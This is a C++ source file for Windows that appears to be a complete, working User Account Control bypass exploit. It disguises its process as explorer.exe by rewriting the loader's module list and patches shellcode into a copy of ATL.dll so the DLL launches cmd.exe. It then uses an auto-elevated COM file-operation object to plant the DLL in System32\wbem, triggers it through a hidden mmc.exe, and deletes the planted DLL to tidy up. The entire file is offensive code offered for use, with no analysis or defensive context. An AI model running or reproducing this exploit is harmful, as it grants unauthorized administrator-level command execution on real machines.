#include <iostream>
#include <fstream>
#include <memory>
#include <filesystem>
#include <Windows.h>
#include <winternl.h>
#include <shlobj.h>
#include <wrl.h>
#define PRINT_HR_MESSAGE(hr) " HRESULT: 0x" << std::hex << hr << std::endl

using Microsoft::WRL::ComPtr;

typedef struct
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// more stuff underneath . . .
} LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY2;

using PLDR_ENUM_CALLBACK = VOID(NTAPI*)(PLDR_DATA_TABLE_ENTRY2 entry, PVOID context, PBOOLEAN stop);

EXTERN_C IMAGE_DOS_HEADER __ImageBase;
EXTERN_C NTSTATUS LdrEnumerateLoadedModules(ULONG flags, PLDR_ENUM_CALLBACK enumProc, PVOID context);

constexpr BYTE shell_code[] = { 0x49, 0x89, 0xE3, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x0F, 0x57,
	0xC0, 0x48, 0x8D, 0x0D, 0x75, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x45, 0x31, 0xC9, 0x0F, 0x11, 0x44, 0x24,
	0x54, 0x45, 0x31, 0xC0, 0x31, 0xD2, 0x0F, 0x11, 0x44, 0x24, 0x64, 0x0F, 0x11, 0x44, 0x24, 0x74, 0x41,
	0x89, 0x43, 0xCC, 0x49, 0x8D, 0x43, 0xD8, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x50,
	0x48, 0x89, 0x44, 0x24, 0x40, 0x31, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x30,
	0x89, 0x44, 0x24, 0x28, 0x41, 0x0F, 0x11, 0x43, 0x9C, 0x89, 0x44, 0x24, 0x20, 0x41, 0x0F, 0x11, 0x43,
	0xAC, 0x41, 0x0F, 0x11, 0x43, 0xBC, 0xC7, 0x44, 0x24, 0x50, 0x68, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x31, 0xC9, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0
};

int main()
{
	std::ios_base::sync_with_stdio(false);

	if (auto hr{ CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY) };
		FAILED(hr))
	{
		std::cout << "CoInitializeEx() failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}
	std::atexit([] {CoUninitialize(); });

	PWSTR path_raw{};
	if (auto hr{ SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &path_raw) }; FAILED(hr))
	{
		CoTaskMemFree(path_raw);
		std::cout << "SHGetKnownFolderPath(0) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}

	auto path_size{ (std::wcslen(path_raw) * 2) + sizeof(L"\\explorer.exe") };
	std::unique_ptr<WCHAR, decltype(&CoTaskMemFree)> path{
		static_cast<PWSTR>(CoTaskMemRealloc(path_raw, path_size)),
		CoTaskMemFree
	};
	memcpy(path.get() + std::wcslen(path_raw), L"\\explorer.exe", sizeof(L"\\explorer.exe"));

	if (auto hr{ SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &path_raw) }; FAILED(hr))
	{
		CoTaskMemFree(path_raw);
		std::cout << "SHGetKnownFolderPath(1) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}

	auto atl_base_csize{ std::wcslen(path_raw) };
	std::unique_ptr<WCHAR, decltype(&CoTaskMemFree)> atl_path{
		static_cast<PWSTR>(CoTaskMemRealloc(path_raw, (atl_base_csize * 2) + sizeof(L"\\wbem\\ATL.dll"))),
		CoTaskMemFree
	};
	memcpy(atl_path.get() + atl_base_csize, L"\\ATL.dll", sizeof(L"\\ATL.dll"));

	struct enum_params
	{
		PWSTR path;
		USHORT size;
	} params{ path.get(), path_size };
	if (auto status{LdrEnumerateLoadedModules(0, [](PLDR_DATA_TABLE_ENTRY2 entry, PVOID context, PBOOLEAN stop)
		{
			if (entry->DllBase == &__ImageBase)
			{
				entry->BaseDllName.Buffer = const_cast<PWSTR>(L"explorer.exe");
				entry->BaseDllName.Length = sizeof(L"explorer.exe");
				entry->BaseDllName.MaximumLength = sizeof(L"explorer.exe");

				auto* params{ reinterpret_cast<enum_params*>(context) };
				entry->FullDllName.Buffer = params->path;
				entry->FullDllName.Length = entry->FullDllName.MaximumLength = params->size;

				*stop = TRUE;
			}
		}, &params)}; !NT_SUCCESS(status))
	{
		std::cout << "LdrEnumerateLoadedModules() failed. NTSTATUS: " << std::hex << status << std::endl;
		return 1;
	}

	std::fstream source_dll{ atl_path.get(), std::ios_base::binary | std::ios_base::ate | std::ios_base::in };
	if (!source_dll)
	{
		std::wcout << L"Failed to open " << atl_path.get() << std::endl;
		return 1;
	}

	auto size{ source_dll.tellg() };
	auto data{ std::make_unique_for_overwrite<char[]>(size) };

	source_dll.seekg(0);
	source_dll.read(data.get(), size);
	if (source_dll.fail())
	{
		std::cout << "Failed to read system ATL.dll\n";
		return 1;
	}
	source_dll.close();

	auto nt_headers{ reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PIMAGE_DOS_HEADER>(data.get())->e_lfanew + data.get()) };
	auto section_headers{ IMAGE_FIRST_SECTION(nt_headers) };

	while (std::strcmp(".text", reinterpret_cast<const char*>(section_headers->Name)))
		++section_headers;

	memcpy(atl_path.get() + atl_base_csize + 1, L"cmd.exe", sizeof(L"cmd.exe"));
	char* zero_block{ reinterpret_cast<char*>(nt_headers->OptionalHeader.AddressOfEntryPoint) };
	zero_block -= section_headers->VirtualAddress;
	zero_block += section_headers->PointerToRawData;
	zero_block = reinterpret_cast<char*>(data.get() + reinterpret_cast<__int64>(zero_block));

	memcpy(zero_block, shell_code, sizeof(shell_code));
	memcpy(zero_block + sizeof(shell_code), atl_path.get(), (atl_base_csize * 2) + sizeof(L"\\cmd.exe"));

	*reinterpret_cast<void**>(zero_block + 0x71) = CreateProcessW;
	*reinterpret_cast<void**>(zero_block + 0x7F) = ExitProcess;

	source_dll.open("dropper", std::ios_base::binary | std::ios_base::out);
	if (!source_dll.is_open())
	{
		std::cout << "Error creating payload drop\n";
		return 1;
	}

	if (source_dll.write(data.get(), size).fail() || source_dll.flush().fail())
	{
		std::cout << "Error writing payload drop\n";
		return 1;
	}
	source_dll.close();

	memcpy(atl_path.get() + atl_base_csize + 1, L"wbem", sizeof(L"wbem"));
	auto current_path{ std::filesystem::current_path() / L"dropper" };
	ComPtr<IShellItem> target, source;

	if (auto hr{ SHCreateItemFromParsingName(atl_path.get(), nullptr, IID_PPV_ARGS(target.GetAddressOf())) }; FAILED(hr))
	{
		std::cout << "SHCreateItemFromParsingName(0) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}
	if (auto hr{ SHCreateItemFromParsingName(current_path.c_str(), nullptr, IID_PPV_ARGS(source.GetAddressOf()))}; FAILED(hr))
	{
		std::cout << "SHCreateItemFromParsingName(1) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}

	ComPtr<IFileOperation> operation;
	BIND_OPTS3 opts{};
	opts.cbStruct = sizeof(BIND_OPTS3);
	opts.dwClassContext = CLSCTX_LOCAL_SERVER;
	if (auto hr{ CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}",
		&opts, IID_PPV_ARGS(operation.GetAddressOf())) }; FAILED(hr))
	{
		std::cout << "CoGetObject() failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}

	if (auto hr{ operation->MoveItem(source.Get(), target.Get(), L"ATL.dll", nullptr) }; FAILED(hr))
	{
		std::cout << "IFileOperation::MoveItem() failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}
	if (auto hr{ operation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI) };
		FAILED(hr))
	{
		std::cout << "IFileOperation::SetOperationFlags() failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}
	if (auto hr{ operation->PerformOperations() }; FAILED(hr))
	{
		std::cout << "IFileOperation::PerformOperations(0) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}

	if (auto result{ reinterpret_cast<int>(ShellExecuteW(nullptr, L"open", L"mmc.exe", L"WmiMgmt.msc", nullptr, SW_HIDE)) }; result <= 32)
		std::cout << "ShellExecuteW failed. Return value: " << result << std::endl;

	Sleep(2000);

	target.Reset();
	memcpy(atl_path.get() + atl_base_csize + 5, L"\\ATL.dll", sizeof(L"\\ATL.dll"));
	if (auto hr{ SHCreateItemFromParsingName(atl_path.get(), nullptr, IID_PPV_ARGS(target.GetAddressOf())) }; FAILED(hr))
	{
		std::cout << "SHCreateItemFromParsingName(2) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}
	if (auto hr{ operation->DeleteItem(target.Get(), nullptr) }; FAILED(hr))
	{
		std::cout << "IFileOperation::DeleteItem() failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}
	if (auto hr{ operation->PerformOperations() }; FAILED(hr))
	{
		std::cout << "IFileOperation::PerformOperations(1) failed." << PRINT_HR_MESSAGE(hr);
		return 1;
	}

	std::cout << "Exploit successful\n";

	return 0;
}